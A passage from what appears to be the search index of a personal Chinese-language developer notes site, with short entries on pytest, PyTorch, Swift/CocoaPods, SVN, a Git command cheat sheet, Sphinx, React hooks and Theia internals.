如果您只想隐藏特定的警告，可以使用filterwarnings选项。\n例如，以下配置将忽略所有用户警告和与正则表达式匹配的特定弃用警告，但将所有其他警告转换为错误: filterwarnings = ignore::UserWarning regex:DeprecationWarning 其他后续补充... pytest","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytest.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytest.html"},{"title":"Pytest常见问题","text":"Pytest测试用例查找不到问题","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytest-common-problem-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytest-common-problem-index.html"},{"title":"pytest","text":"常见问题","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytest-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytest-index.html"},{"title":"pytorch","text":"参考: 60分钟快速入门 PyTorch PyTorch 是由 Facebook 开发，基于 Torch 开发，\n从并不常用的 Lua 语言转为 Python 语言开发的深度学习框架，\nTorch 是 TensorFlow 开源前非常出名的一个深度学习框架，\n而 PyTorch 在开源后由于其使用简单，\n动态计算图的特性得到非常多的关注，并且成为了 TensorFlow 的 最大竞争对手。 安装: pip3 install torch torchvision torchaudio 检测是否适用于当前机器显卡: import torch\n\nprint(torch.cuda.is_available()) API autograd 神经网络 实例-训练分类器 张量(Tensors) 相当于 Numpy 的多维数组(ndarrays)。两者的区别就是 Tensors 可以应用到 GPU 上加快计算速度 声明与定义 torch.empty() 声明一个未初始化的 Tensors 矩阵 torch.rand() 随机初始化一个矩阵 torch.zeros() 创建数值皆为 0 的矩阵 torch.ones() 创建数值皆为 1 的矩阵 torch.tensor() 直接传递 tensor 数值来创建 tensor.new_ones() 根据已有的 tensor 变量创建新的 tensor 变量 torch.randn_like(old_tensor) 保留相同的尺寸大小 tensor.size() 获取张量大小 关于API的详细说明, 见 API 和 Numpy 数组的转换 Tensor 和 Numpy 的数组可以相互转换，\n并且两者转换后共享在 CPU 下的内存空间，\n即改变其中一个的数值，另一个变量也会随之改变。 Tensor 转换为 Numpy 数组 实现 Tensor 转换为 Numpy 数组的例子如下所示，\n调用 tensor.numpy() 可以实现这个转换操作: a = torch.ones(5)\nprint(a)\nb = a.numpy()\nprint(b) 输出结果: tensor([1., 1., 1., 1., 1.])\n[1. 1. 1. 1. 1.] b 也随着 a 的改变而改变: a.add_(1)\nprint(a)\nprint(b) 输出结果: tensor([2., 2., 2., 2., 2.])\n[2. 2. 2. 2. 2.] Numpy 数组转换为 Tensor 转换的操作是调用 torch.from_numpy(numpy_array) 方法。\n例子如下所示: import numpy as np\na = np.ones(5)\nb = torch.from_numpy(a)\nnp.add(a, 1, out=a)\nprint(a)\nprint(b) 输出结果: [2. 2. 2. 2. 2.]\ntensor([2., 2., 2., 2., 2.], dtype=torch.float64) 在 CPU 上，除了 CharTensor 外的所有 Tensor 类型变量，都支持和 Numpy数组的相互转换操作 CUDA 张量 Tensors 可以通过 .to 方法转换到不同的设备上，即 CPU 或者 GPU 上。\n例子如下所示: # 当 CUDA 可用的时候，可用运行下方这段代码，采用 torch.device() 方法来改变 tensors 是否在 GPU 上进行计算操作\nif torch.cuda.is_available():\n    device = torch.device(\"cuda\")          # 定义一个 CUDA 设备对象\n    y = torch.ones_like(x, device=device)  # 显示创建在 GPU 上的一个 tensor\n    x = x.to(device)                       # 也可以采用 .to(\"cuda\")\n    z = x + y\n    print(z)\n    print(z.to(\"cpu\", torch.double))       # .to() 方法也可以改变数值类型 输出结果，第一个结果就是在 GPU 上的结果，\n打印变量的时候会带有 device='cuda:0'，而第二个是在 CPU 上的变量: tensor([1.4549], device='cuda:0')\ntensor([1.4549], dtype=torch.float64)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pytorch-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pytorch-index.html"},{"title":"sklearn提供的API","text":"datasets impute linear_model metrics model_selection","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-API-index.html"},{"title":"scikit-learn","text":"介绍 Scikit-learn是一个非常强大的工具，能为库的开发提供了高水平的支持和严格的管理。 清晰一致的代码样式可确保我们的机器学习代码易于理解和再现，并大大降低了对机器学习模型进行编码的入门门槛。 Scikit-learn得到了很多第三方工具的支持，有非常丰富的功能适用于各种用例。 有一个中文社区(不知是官方还是自由社区): https://scikit-learn.org.cn 安装: pip install scikit-learn 简单使用教程 API 问题","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-index.html"},{"title":"问题/报错总结","text":"lbfgs failed to converge","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-question-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-scikit-learn-question-index.html"},{"title":"selenium","text":"中文官网: https://www.selenium.dev/zh-cn/documentation/webdriver/ 入门: https://www.selenium.dev/zh-cn/documentation/webdriver/getting_started/ 下载chrome驱动: http://chromedriver.storage.googleapis.com/index.html 注解 此文档基于 selenium 4.0 Selenium 是支持 web 浏览器自动化的一系列工具和库的综合项目。 Selenium 通过使用 WebDriver 支持市场上所有主流浏览器的自动化。\nWebdriver 是一个 API 和协议，它定义了一个语言中立的接口，用于控制 web 浏览器的行为。\n每个浏览器都有一个特定的 WebDriver 实现，称为驱动程序。\n驱动程序是负责委派给浏览器的组件，并处理与 Selenium 和浏览器之间的通信。 安装 原理-结构 浏览器加载选项 服务 chrome支持的选项 等待 元素支持 交互 Actions接口 Grid-并行支持","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-selenium-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-selenium-index.html"},{"title":"torch-directml","text":"一个支持 AMD 系列显卡, 在深度学习时, 使用类似 N卡那样的 to(\"cuda\") 的加速. 不过仅支持 Windows 与其 WSL 子系统. 相关资源 pypi: https://pypi.org/project/torch-directml/ 安装 pip install torch-directml 使用 import torch if torch . backends . dml . is_available (): print ( \"DirectML backend is available.\" ) pipeline . to ( \"dml\" ) else : print ( \"DirectML backend is not available.\" )","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-torch-directml.html","loc":"/yq-docs-rear-end-python-python-three--party-library-torch-directml.html"},{"title":"包管理工具pod(cocoapods)","text":"参考: https://juejin.cn/post/6932739864613879821 类似于Java的Maven 需要先有Ruby, 因为pod是用Ruby写的,\n可参考: index 安装: gem install cocoapods\npod setup 配置镜像 参考: https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/ 内容: CocoaPods 是一个 Cocoa 和 Cocoa Touch 框架的依赖管理器，具体原理和 Homebrew 有点类似，都是从 GitHub 下载索引，然后根据索引下载依赖的源代码。\n\n对于旧版的 CocoaPods 可以使用如下方法使用 tuna 的镜像：\n\n$ pod repo remove master\n$ pod repo add master https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git\n\n# 把所有上传到cocoapods的第三方框架下载每个版本和网络地址以及一些其他描述信息到本地\n$ pod repo update\n\n新版的 CocoaPods 不允许用pod repo add直接添加master库了，但是依然可以：\n\n$ cd ~/.cocoapods/repos\n$ pod repo remove master\n$ git clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master\n最后进入自己的工程，在自己工程的podFile第一行加上：\n\nsource 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' 克隆镜像有点慢, 我这花了9分半 Mac默认缓存位置是在: /Users/用户名/.cocoapods/repos 应该是pod转了一遍网络的原因, 导致github没有走clash的代理,\n全局代理也无效; 只能手动配置一下了: git config --global http.https://github.com.proxy socks5://127.0.0.1:60742 还没试, 后面试试. 附, 恢复: git config --global --unset http.proxy 复制代码\n\ngit config --global --unset http.https://github.com.proxy 复制代码 使用 命令行方式: pod init 或者手动创建 Podfile : source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git'\n\nplatform :osx, '14.0'\nuse_frameworks!\n\ntarget 'CQ' do\n    pod 'KeyboardShortcuts', '~> 1.16.1'\nend 第一行指定源 后续安装直接: pod install 即可 注解 这里用的 KeyboardShortcuts 发现pod上面版本只有 0.7.1 , 太低了, 放弃 重要 使用pod的项目, 一定要使用 项目名.xcworkspace 打开, 才是 pod 的配置,\n否则找不到pod安装的模块","tags":"后端","url":"/yq-docs-rear-end-swift-Package-management-tool-pod.html","loc":"/yq-docs-rear-end-swift-Package-management-tool-pod.html"},{"title":"swift","text":"官网: https://www.swift.org 官网API文档: https://developer.apple.com/documentation/technologies 官网教程只有英文 一个用于在Apple设备上开发的语言 现在基本是 Object-C 后的接替了 安装 Mac上直接安装Xcode就行了, 自带Swift. 其他平台可参考: https://www.swift.org/install/ Swift内置了一个包管理, 能够更简单的导入,\n包索引查询: https://swiftpackageindex.com 一些网站 民间(NGO, Non-Governmental Organization)中文社区: https://swiftgg.team 民间Swift语法中文版(相对更新慢一点): https://gitbook.swiftgg.team/swift/ 民间Swift 基本约定译文: https://github.com/SketchK/the-swift-api-design-guidelines-in-chinese 注解 swift 坑比较多, 资料也比较少... 打算做一个快捷键的, 东西太少 找到个可以借鉴的项目: git clone https://github.com/tkgka/Switcher.git git地址: https://github.com/tkgka/Switcher 注解 国内NGO就是社会组织 包管理工具pod 官方库 三方库 基本语法 事件类型 Apple证书类型 swift结构体与类区别 属性包装器 异步 教程-Xcode 教程 访问C头文件的几种方式 使用modulemap导入C++框架 桥接导入C 使用SPM(Swift Package Manager) 备注 对于MacOS 要使App全局显示, 只有设置 Info 为 Application is agent (UIElement) ,\n比如显示在其他全屏App上. 这是用其他语言暂时无法实现的... 单独的 Swift-View 如果要作为一个弹出窗体, 需要转换为 NSWindow 对于单独的 NSWindow , 直接给 delegate 会存在问题... 有个一直未解决的问题, 本地构建的App, 重新构建后, 识别不了上个版本获取的权限, 比如辅助功能... 某段时间一度以为是APP需要签名(证书签名)的问题, 直到后面看到 macbartender 的说明 https://www.macbartender.com/Bartender5/PermissionIssues/ , 他们的意思是这是MacOS的bug, 需要先手动删除上次的再加权限才行. 不过也可以试一下正确签名, 说不定能解决, 因为有某次的一个包就是签名了一只没遇到此问题","tags":"后端","url":"/yq-docs-rear-end-swift-index.html","loc":"/yq-docs-rear-end-swift-index.html"},{"title":"swift教程","text":"swift3.x升级到5.x 命令行创建并运行项目 增加依赖 DEBUG条件 桥接导入C 使用modulemap导入C++框架 使用SPM(Swift Package Manager)","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-index.html","loc":"/yq-docs-rear-end-swift-turtorial-index.html"},{"title":"Xcode教程","text":"xcode15新功能 Xcode的Info配置 Xcode-分发打包 Xcode删除掉强制证书","tags":"后端","url":"/yq-docs-rear-end-swift-xcode-turtorial-index.html","loc":"/yq-docs-rear-end-swift-xcode-turtorial-index.html"},{"title":"SVN","text":"安装: apt install subversion 配置 其实不需要怎么配置， 遇到的问题是普通用户每次都需要输入密码 修改: # ~/.subversion/config\n\n# 允许明码记住密码\npassword-stores = simple\n\n\n# 也可以在这里设置选项\n# ~/.subversion/servers\nstore-plaintest-passwords\n\n\n# 解压到指定路径 这个时候是 $svn_path 下的所有文件 在 $local_path下面\nsvn checkout $svn_path $local_path\n\n# 先进去再解压 这个时候是svn地址 当前文件开始命名\ncd $local_path && svn checkout $svn_path\n\n# 更新\ncd $local_path\nsvn update 关于错误：svn \"cannot set LC_CTYPE locale\"的问题 解决: # 修改/etc/profile\n# 加入\nexport LC_ALL=C\n# 然后在终端执行：\nsource /etc/profile 毛用没有， 这样弄才解决的: sudo dpkg-reconfigure locales 重新安装了一下语言为en_US.UTF-8 看了一下 /etc/default/locale的内容，变成了: LC_CTYPE=\"en_US.UTF-8\"\nLC_ALL=\"en_US.UTF-8\"\nLANG=\"en_US.UTF-8\" （之前设置的环境为中文，所以可能脚本不兼容我这个系统） 后面有时间看看这几个变量的区别 参考链接： https://askubuntu.com/questions/599808/cannot-set-lc-ctype-to-default-locale-no-such-file-or-directory 关于冲突的问题 使用 svn cleanup 无效 然后删除了重新checkout的 svn blame 查看具体的每一行代码的变更信息","tags":"版本控制","url":"/yq-docs-version-control-SVN-index.html","loc":"/yq-docs-version-control-SVN-index.html"},{"title":"SVN与Git的区别","text":"参考: svn与git的区别（总结） 版本控制器的作用 可以协同代码管理，让多人开发代码得以实现。 回归到以前的任何一个时间点的代码处\n（好比：开始写了很多代码，后面有修改了一些，突然IDE崩溃，但是发现还是以前的代码更好，\n这个时候无法回去，这个时候没有后悔药吃，但是可以使用版本备份，但是即花费空间和花费时间）。 由于上面的版本备份造成版本众多，难于找到正确的版本（SVN有专门的日志记录了文件的每一次修改，可以通过查看日志回到任何一个自己想要的版本）。 代码冲突的问题，主要是多人操作同一个文件（团队开发很常见）。 可以查看每个人具体的操作，便于出现问题后及时排查（由于某个员工个人失误造成很大的bug，可以方便的追究责任）。 常见的版本控制器分类 CVS（90年代开发，版本控制器的鼻祖） SVN（CVS的接班人） VSS（微软产品） GIT（李纳斯开发） SVN SVN：代码控制器（版本控制器），主要是为了多人协同开发项目，\n管理代码。也可以管理个人代码。也叫程序界的\"后悔药\"。 SVN（是subversion的简称）是近年来一款基于C/S架构的，非常优秀的版本控制器（可以简单的理解为管理代码的工具，在多人协同开发的时候，尤其重要），\n与传统的CVS（90年代左右，一个非常优秀的代码管理器，是代码管理器的鼻祖）管理工具类似。 SVN可以随着时间的推移来管理各种数据，这些数据被放置在一个SVN管理的中央仓库（所有的代码的集合）里面。\n同时SVN会备份并记录每个文件每一次的修改更新变动。\n这样就开发者就可以回归到任何一个时间点的某一个旧的版本（对于SVN，没修改一次文件，SVN就会创建一个叫做版本的概念，是从0 开始自增的序列）。\n当然也可以指定文件的更新历史记录（index.php）。 SVN又叫做集中式版本控制器。严重的依赖服务器端，当服务器端无法使用的时候，版本控制也就无法再使用了。 GIT Git是目前世界上最先进的分布式版本控制系统（没有之一）。\n当这个系统的任何一个客户端出现问题的时候，都可以从另外的客户端（即使服务器挂了）获取所有的代码。 SVN与GIT的区别 GIT是分布式的，而SVN是集中式的 GIT把内容按元数据方式存储，而SVN是按文件：因为git目录是处于个人机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。 GIT分支和SVN的分支不同：svn会发生分支遗漏的情况，而git可以同一个工作目录下快速的在几个分支间切换，很容易发现未被合并的分支，简单而快捷的合并这些文件。 GIT没有一个全局的版本号，而SVN有 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 集中式和分布式的区别 集中式版本控制系统：版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，\n所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，\n再把自己的活推送给中央服务器。集中式版本控制系统最大的毛病就是必须联网才能工作。 分布式版本控制系统：分布式版本控制系统根本没有\"中央服务器\"，每个人的电脑上都是一个完整的版本库，\n这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。\n比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A，\n这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。 为了方便\"交换\"大家的修改，分布式版本控制系统通常也有一台充当\"中央服务器\"的电脑，但没有它大家也一样干活，只是交换修改不方便而已。 分布式版本控制系统的安全性要高很多，因为每个人电脑里都有完整的版本库，\n某一个人的电脑坏掉了不要紧，随便从其他人那里复制一个就可以了。\n而集中式版本控制系统的中央服务器要是出了问题，所有人都没法干活了。 参考: https://blog.csdn.net/qq_40143330/article/details/79816024 常用命令 Git vs SVN Git 和 SVN 孰优孰好，每个人有不同的体验。 Git是分布式的，SVN是集中式的 这是 Git 和 SVN 最大的区别。若能掌握这个概念，两者区别基本搞懂大半。\n因为 Git 是分布式的，所以 Git 支持离线工作，在本地可以进行很多操作，\n包括接下来将要重磅推出的分支功能。而 SVN 必须联网才能正常工作。 Git复杂概念多，SVN简单易上手 所有同时掌握 Git 和 SVN 的开发者都必须承认，Git 的命令实在太多了，\n日常工作需要掌握 add , commit , status , fetch , push , rebase`等，\n若要熟练掌握，还必须掌握 `rebase 和 merge 的区别， fetch 和 pull 的区别等，除此之外，还有 cherry-pick , submodule , stash 等功能，仅是这些名词听着都很绕。 在易用性这方面，SVN 会好得多，简单易上手，对新手很友好。\n但是从另外一方面看，Git 命令多意味着功能多，若我们能掌握大部分 Git 的功能，\n体会到其中的奥妙，会发现再也回不去 SVN 的时代了。 Git分支廉价，SVN分支昂贵 在版本管理里，分支是很常使用的功能。\n在发布版本前，需要发布分支，进行大需求开发，需要 feature 分支，\n大团队还会有开发分支，稳定分支等。在大团队开发过程中，常常存在创建分支，切换分支的需求。 Git 分支是指针指向某次提交，而 SVN 分支是拷贝的目录。这个特性使 Git 的分支切换非常迅速，且创建成本非常低。 而且 Git 有本地分支，SVN 无本地分支。\n在实际开发过程中，经常会遇到有些代码没写完，但是需紧急处理其他问题，\n若我们使用 Git，便可以创建本地分支存储没写完的代码，待问题处理完后，再回到本地分支继续完成代码。 Git 核心概念 Git 最核心的一个概念就是工作流。 工作区(Workspace)是电脑中实际的目录。 暂存区(Index)类似于缓存区域，临时保存你的改动。 仓库区(Repository)，分为本地仓库和远程仓库。 从 SVN 切换到 Git，最难理解并且最不能理解的是暂存区和本地仓库。熟练使用 Git 后，会发现这简直是神设计，由于这两者的存在，使许多工作变得易管理。 通常提交代码分为几步： git add 从工作区提交到暂存区 git commit 从暂存区提交到本地仓库 git push 或 git svn dcommit 从本地仓库提交到远程仓库 Git-SVN常用命令 本节命令针对使用 Git-SVN 的开发者，请务必掌握。 若服务器使用的 SVN，但是本地想要体验 Git 的本地分支，离线操作等功能，可以使用 Git-SVN 功能。 常用操作: # 下载一个 SVN 项目和它的整个代码历史，并初始化为 Git 代码库\n$ git svn clone -s [repository]\n\n# 查看当前版本库情况\n$ git svn info\n\n# 取回远程仓库所有分支的变化\n$ git svn fetch\n\n# 取回远程仓库当前分支的变化，并与本地分支变基合并\n$ git svn rebase\n\n# 上传当前分支的本地仓库到远程仓库\n$ git svn dcommit\n\n# 拉取新分支，并提交到远程仓库\n$ svn copy [remote_branch] [new_remote_branch] -m [message]\n\n# 创建远程分支对应的本地分支\n$ git checkout -b [local_branch] [remote_branch] 初始化 从本节开始，除特殊说明，以下命令均适用于 Git 与 Git-SVN : # 在当前目录新建一个Git代码库\n$ git init\n\n# 下载一个项目和它的整个代码历史 [Git only]\n$ git clone [url] 配置 列举所有配置: $ git config -l 为命令配置别名: $ git config --global alias.co checkout\n$ git config --global alias.ci commit\n$ git config --global alias.st status\n$ git config --global alias.br branch 设置提交代码时的用户信息: $ git config [--global] user.name \"[name]\"\n$ git config [--global] user.email \"[email address]\" Git 用户的配置文件位于 ~/.gitconfig Git 单个仓库的配置文件位于 ~/$PROJECT_PATH/.git/config 增删文件 添加当前目录的所有文件到暂存区: $ git add . 添加指定文件到暂存区: $ git add <file1> <file2> ... 添加指定目录到暂存区，包括其子目录: $ git add <dir> 删除工作区文件，并且将这次删除放入暂存区: $ git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区: $ git rm --cached [file] 改名文件，并且将这个改名放入暂存区: $ git mv [file-original] [file-renamed] 把文件名 file1 添加到 .gitignore 文件里，Git 会停止跟踪 file1 的状态。 分支 列出所有本地分支: $ git branch 列出所有本地分支和远程分支: $ git branch -a 新建一个分支，但依然停留在当前分支: $ git branch [branch-name] 新建一个分支，并切换到该分支: $ git checkout -b [new_branch] [remote-branch] 切换到指定分支，并更新工作区: $ git checkout [branch-name] 合并指定分支到当前分支: $ git merge [branch] 选择一个 commit，合并进当前分支: $ git cherry-pick [commit] 删除本地分支，-D 参数强制删除分支: $ git branch -d [branch-name] 删除远程分支: $ git push [remote] :[remote-branch] 提交 提交暂存区到仓库区: $ git commit -m [message] 提交工作区与暂存区的变化直接到仓库区: $ git commit -a 提交时显示所有 diff 信息: $ git commit -v 提交暂存区修改到仓库区，合并到上次修改，并修改上次的提交信息: $ git commit --amend -m [message] 上传本地指定分支到远程仓库: $ git push [remote] [remote-branch] 拉取 下载远程仓库的所有变动 (Git only): $ git fetch [remote] 显示所有远程仓库 (Git only): $ git remote -v 显示某个远程仓库的信息 (Git only): $ git remote show [remote] 增加一个新的远程仓库，并命名 (Git only): $ git remote add [remote-name] [url] 取回远程仓库的变化，并与本地分支合并，(Git only), 若使用 Git-SVN，请查看第三节: $ git pull [remote] [branch] 取回远程仓库的变化，并与本地分支变基合并，(Git only), 若使用 Git-SVN，请查看第三节: $ git pull --rebase [remote] [branch] 撤销 恢复暂存区的指定文件到工作区: $ git checkout [file] 恢复暂存区当前目录的所有文件到工作区: $ git checkout . 恢复工作区到指定 commit: $ git checkout [commit] 重置暂存区的指定文件，与上一次 commit 保持一致，但工作区不变: $ git reset [file] 重置暂存区与工作区，与上一次 commit 保持一致: $ git reset --hard 重置当前分支的指针为指定 commit，同时重置暂存区，但工作区不变: $ git reset [commit] 重置当前分支的HEAD为指定 commit，同时重置暂存区和工作区，与指定 commit 一致: $ git reset --hard [commit] 新建一个 commit，用于撤销指定 commit: $ git revert [commit] 将未提交的变化放在储藏区: $ git stash 将储藏区的内容恢复到当前工作区: $ git stash pop 查询 查看工作区文件修改状态: $ git status 查看工作区文件修改具体内容: $ git diff [file] 查看暂存区文件修改内容: $ git diff --cached [file] 查看版本库修改记录: $ git log 查看某人提交记录: $ git log --author=someone 查看某个文件的历史具体修改内容: $ git log -p [file] 查看某次提交具体修改内容: $ git show [commit]","tags":"版本控制","url":"/yq-docs-version-control-The-difference-between-SVN-and-git.html","loc":"/yq-docs-version-control-The-difference-between-SVN-and-git.html"},{"title":"指令","text":"blame branch checkout commit config diff fetch log merge pull push rebase reflog release reset restore revert show stash status submodule tag update-index","tags":"版本控制","url":"/yq-docs-version-control-git-Command-index.html","loc":"/yq-docs-version-control-git-Command-index.html"},{"title":"git 命令","text":"./command 如何表示版本号联系 可以使用 版本号~num 表示. 比如有一个hash的版本号: 1109duw1 ,\n前一个版本可以表示为: 1109duw1~1 ,\n前第二个版本: 1109duw1~2","tags":"版本控制","url":"/yq-docs-version-control-git-git-command.html","loc":"/yq-docs-version-control-git-git-command.html"},{"title":"Git","text":"git命令 git工作原理 一些问题,用法 换行符问题 编辑器问题","tags":"版本控制","url":"/yq-docs-version-control-git-index.html","loc":"/yq-docs-version-control-git-index.html"},{"title":"toctree通配符失效","text":"toctree有一个glob属性, 需要指定才可以使用通配符: .. toctree::\n  :glob:\n\n  xxx/* 官文原文说明: You can use \"globbing\" in toctree directives, by giving the glob flag option.\nAll entries are then matched against the list of available documents, and matches are inserted into the list alphabetically. Example:\n\n.. toctree::\n  :glob:\n\n  intro*\n  recipe/*\n  * 使用此属性, 将匹配, 按结果字母顺序列出.","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-TOCTREE-generals-failed.html","loc":"/yq-docs-document-RST-mark-language-question-TOCTREE-generals-failed.html"},{"title":"便捷启动服务","text":"直接访问构建出的HTML源码不方便, 可以启动一个本地HTTP服务: sphinx-autobuild source build/html 注解 需要先安装: pip install sphinx-autobuild -i https://mirrors.aliyun.com/pypi/simple 参考: sphinx-autobuild","tags":"文档","url":"/yq-docs-document-RST-mark-language-question-Convenient-start--up-service.html","loc":"/yq-docs-document-RST-mark-language-question-Convenient-start--up-service.html"},{"title":"DDD","text":"对DDD的理解 最开始的MVC只是抽象出一个Model实体, 做ORM; 业务复杂度堆积在Service层,\n将Service的业务实现抽象为一个通用的 \"领域对象\"(可以理解为一个特殊的Model), 就叫DDD","tags":"后端","url":"/yq-docs-rear-end-java-DDD.html","loc":"/yq-docs-rear-end-java-DDD.html"},{"title":"sphinx-autobuild","text":"一个直接将 Sphinx 项目启动在本地的指令 安装: pip install sphinx-autobuild -i https://mirrors.aliyun.com/pypi/simple 启动: sphinx-autobuild source build/html","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-sphinx-autobuild.html","loc":"/yq-docs-rear-end-python-python-three--party-library-sphinx-autobuild.html"},{"title":"Ruby","text":"安装配置 安装: brew install ruby 配置: ###\n# ruby\n###\n\n# export PATH=\"/usr/local/opt/ruby/bin:$PATH\"\n\n# compilers to find ruby\nexport LDFLAGS=\"-L/usr/local/opt/ruby/lib\"\nexport CPPFLAGS=\"-I/usr/local/opt/ruby/include\"\n\n# pkg-config to find ruby\nexport PKG_CONFIG_PATH=\"/usr/local/opt/ruby/lib/pkgconfig\" 写到 ~/.zshrc 配置源: # 查看当前源\ngem source -l\n\n# 移除\ngem source --remove https://rubygems.org/\n\n# 添加国内镜像\ngem source -a https://gems.ruby-china.com/","tags":"后端","url":"/yq-docs-rear-end-ruby-index.html","loc":"/yq-docs-rear-end-ruby-index.html"},{"title":"useRef","text":"仅支持函数组件. 与 createRef 使用基本一致,\n区别在于: createRef 每次渲染都会返回一个新的引用，而 useRef 每次都会返回相同的引用。 官方文档内容: useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。 换句话说, 在 函数组件中 , 当触发重新渲染时, 使用 createRef 声明的变量, 会先销毁(变量重置为null), 然后再重新赋值 ( 在类组件中效果是正常的hook ) 使用 useRef 声明的变量, 第一次声明后就一直存在.\nuseRef 适用于函数组件中需要在多次渲染之间保持引用的情况. 参考:: 什么是 useRef , useRef 与 createRef 区别, 以及在什么情况下使用 useRef 精读《useRef 与 createRef 的区别》 useRef、createRef的区别及使用，及useRef妙用","tags":"前端","url":"/yq-docs-front-end-frame-react-hooks-useref.html","loc":"/yq-docs-front-end-frame-react-hooks-useref.html"},{"title":"调用自定义子函数组件属性","text":"关键字:: React 父组件调用子组件 父组件调用子函数组件 父组件调用自定义子函数组件 见 useImperativeHandle 的 React-Hook_给非DOM函数组件增加ref属性 forwardRef useImperativeHandle","tags":"前端","url":"/yq-docs-front-end-frame-react-question-Call-the-custom-sub--function-component-attribute.html","loc":"/yq-docs-front-end-frame-react-question-Call-the-custom-sub--function-component-attribute.html"},{"title":"函数组件无ref属性","text":"函数组件默认没有ref属性,\n.. 需要使用forwardRef来传递ref:\n需要使用 forwardRef 包装: const PSelect00 = (props: any, ref) => {\n\n    return (\n        <div ref={ref}>p0</div>\n    )\n}\n\nconst PSelect0 = React.forwardRef((props, ref) => {\n    return (\n        <PSelect00 ref={ref}>p0</PSelect00>\n    )\n})\n\nconst PSelect1 = () => {\n    const refP0 = React.useRef()\n    return <PSelect0 ref={refP0}/>\n} 还有就是暴露自定义组件实例, 自定义暴露内容, 见 forwardRef useImperativeHandle","tags":"前端","url":"/yq-docs-front-end-frame-react-question-Functional-component-no-REF-attribute.html","loc":"/yq-docs-front-end-frame-react-question-Functional-component-no-REF-attribute.html"},{"title":"关于vscode的语言服务器","text":"主要是与插件相关的吧. vscode为了解决以下问题: 语言服务器若要同时兼容所有语言, 太过臃肿 浪费资源 与编辑器标准不一致, 导致每个语言的服务器都要适配一种编辑器 所有制定了语言服务器标准协议LSP(Language Server Protocol), 保证了 每一种语言服务器都能适配所有遵照此LSP标准的编辑器 相关github地址: https://github.com/Microsoft/vscode-languageserver-node 原文介绍: https://code.visualstudio.com/api/language-extensions/language-server-extension-guide#why-language-server 实现自定义的语言服务器 主要两个方面: 语言服务器客户端: 需要实现vscode的相应api 语言服务器服务端: 实际的语法分析(单独的进程)","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-About-VSCode's-language-server.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-About-VSCode's-language-server.html"},{"title":"theia源码之user-storage","text":"注解 此文基于 @theia 版本 1.43.1 此篇幅涉及到的是theia配置相关 比如 theia 默认的配置目录为: {家目录}/.theia 默认配置-EnvVariablesServerImpl 默认的环境配置为 EnvVariablesServerImpl ,\n源码位置: @theia/core/src/node/env-variables/env-variables-server.ts 源码很简单, 这里只说下它做了什么: 实例化时候就配置 configDirUri ,\n优先将 process.env.THEIA_CONFIG_DIR (即环境变量THEIA_CONFIG_DIR) 设置为配置根目录;\n若不存在, 再将 join(homedir(), '.theia') 设置为配置根; 或者说设置为 configDirUri 其他就是将系统传入的环境变量解析下, 可以通过 getVariables() 获取 等... user-storage映射 如果你有跟过theia首选项保存的断点,\n很容易就发现, 保存时候使用的 uri 为: user-storage:/user/settings.json 这实际上是一个抽象的虚拟映射路径, 映射关系定义在 UserStorageContribution ,\n位置: @theia/userstorage/src/browser/user-storage-contribution.ts 它通过 默认配置-EnvVariablesServerImpl 提供的 configDirUri 来定义映射关系,\n比如: user-storage:/user/settings.json 的默认本地磁盘位置为: {homedir}/.theia/settings.json createProvider 是具体的实现(只截取关键部分): uriConverter: {\n    to: resource => {\n        const relativePath = UserStorageUri.relative(resource);\n        if (relativePath) {\n            return configDirUri.resolve(relativePath).normalizePath();\n        }\n        return undefined;\n    },\n    from: resource => {\n        const relativePath = configDirUri.relative(resource);\n        if (relativePath) {\n            return UserStorageUri.resolve(relativePath);\n        }\n        return undefined;\n    }\n} 完","tags":"前端","url":"/yq-docs-front-end-frame-theia-Technical-realization-Theia-source-code--User-Storage.html","loc":"/yq-docs-front-end-frame-theia-Technical-realization-Theia-source-code--User-Storage.html"},{"title":"关于theia的绑定","text":"自定义拓展可见 创建自定义拓展 一般来说, 自定义拓展都需要在package.json声明入口文件: \"theiaExtensions\": [\n  \"hello-world/lib/browser/hello-world-frontend-module\"\n] 入口文件内一般都是相应的绑定: import { ContainerModule } from '@theia/core/shared/inversify';\n\nexport default new ContainerModule(\n    (bind, unbind, isBound, rebind, unbindAsync, onActivation, onDeactivation) => {\n     